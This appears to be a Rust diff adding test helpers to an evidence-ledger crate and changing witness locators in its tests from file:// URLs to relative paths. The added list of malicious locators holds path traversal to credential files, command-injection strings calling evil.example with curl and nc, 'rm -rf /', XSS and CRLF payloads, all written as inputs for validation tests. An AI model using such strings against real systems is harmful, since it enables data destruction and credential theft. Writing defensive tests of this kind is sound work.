@@ -2,6 +2,78 @@ pub mod durability_violation;
 pub mod evidence_ledger;
 pub mod witness_ref;
 
+#[cfg(feature = "test-support")]
+pub mod test_support {
+    use super::evidence_ledger::{DecisionKind, EvidenceEntry};
+    use super::witness_ref::{WitnessKind, WitnessRef, WitnessSet};
+
+    pub fn obs_digest(seed: u8) -> [u8; 32] {
+        let mut bytes = [0_u8; 32];
+        bytes[0] = seed;
+        bytes[31] = seed;
+        bytes
+    }
+
+    pub fn obs_entry(decision_id: &str, decision_kind: DecisionKind) -> EvidenceEntry {
+        EvidenceEntry {
+            schema_version: "observability-root-test-v1".to_string(),
+            entry_id: None,
+            decision_id: decision_id.to_string(),
+            decision_kind,
+            decision_time: "2026-04-17T00:00:00Z".to_string(),
+            timestamp_ms: 1_000,
+            trace_id: format!("trace-{decision_id}"),
+            epoch_id: 7,
+            payload: serde_json::Value::Null,
+            size_bytes: 0,
+        }
+    }
+
+    pub fn obs_witness(id: &str, kind: WitnessKind, seed: u8) -> WitnessRef {
+        WitnessRef::new(id, kind, obs_digest(seed))
+    }
+
+    pub fn obs_single_witness_set(witness: WitnessRef) -> WitnessSet {
+        let mut set = WitnessSet::new();
+        set.add(witness);
+        set
+    }
+
+    pub fn safe_replay_bundle_locators() -> &'static [&'static str] {
+        &[
+            "tmp/witness-present.jsonl",
+            "bundles/replay-001.jsonl",
+            "tenant_01/witness.proof",
+            "evidence/bundle_2026-04-22.jsonl",
+        ]
+    }
+
+    pub fn malicious_replay_bundle_locators() -> Vec<String> {
+        let mut locators = vec![
+            "file:///../../../etc/passwd".to_string(),
+            "file:///C:\\Windows\\System32\\config\\SAM".to_string(),
+            "file:///proc/self/environ".to_string(),
+            "file:///dev/random".to_string(),
+            "http://evil.example/exfiltrate".to_string(),
+            "ftp://attacker.example/steal".to_string(),
+            "ldap://malicious.example/inject".to_string(),
+            "ssh://evil.example:22/backdoor".to_string(),
+            "javascript:alert('xss')".to_string(),
+            "data:text/html,<script>evil()</script>".to_string(),
+            "../../../home/user/.ssh/id_rsa".to_string(),
+            "tmp/witness.jsonl; rm -rf /".to_string(),
+            "tmp/$(curl evil.example/steal)".to_string(),
+            "tmp/witness.jsonl`nc evil.example 4444`".to_string(),
+            "tmp/witness\u{0000}.jsonl".to_string(),
+            "tmp/witness\r\nHost: evil.example\r\n".to_string(),
+            "//evil.example/share/witness.jsonl".to_string(),
+            "tmp/%2e%2e/secret.jsonl".to_string(),
+        ];
+        locators.push("a".repeat(513));
+        locators
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::evidence_ledger::{DecisionKind, EvidenceEntry};
@@ -213,7 +285,7 @@ mod tests {
         let mut witnesses = WitnessSet::new();
         witnesses.add(
             obs_witness("obs-locator-present", WitnessKind::Telemetry, 10)
-                .with_locator("file:///tmp/witness-present.jsonl"),
+                .with_locator("tmp/witness-present.jsonl"),
         );
         witnesses.add(obs_witness(
             "obs-locator-missing",
@@ -376,11 +448,11 @@ mod tests {
         let mut witnesses = WitnessSet::new();
         witnesses.add(
             obs_witness("obs-locator-one", WitnessKind::Telemetry, 24)
-                .with_locator("file:///tmp/witness-one.jsonl"),
+                .with_locator("tmp/witness-one.jsonl"),
         );
         witnesses.add(
             obs_witness("obs-locator-two", WitnessKind::StateSnapshot, 25)
-                .with_locator("file:///tmp/witness-two.jsonl"),
+                .with_locator("tmp/witness-two.jsonl"),
         );
         witnesses.add(
             obs_witness("obs-locator-late-blank", WitnessKind::ProofArtifact, 26)
@@ -1216,7 +1288,7 @@ mod tests {
                 };
 
                 let witness = obs_witness(&witness_id, witness_kind, (i % 256) as u8)
-                    .with_locator(&format!("file:///tmp/complex-{}.jsonl", i));
+                    .with_locator(&format!("tmp/complex-{}.jsonl", i));
 
                 complex_witnesses.add(witness);
 
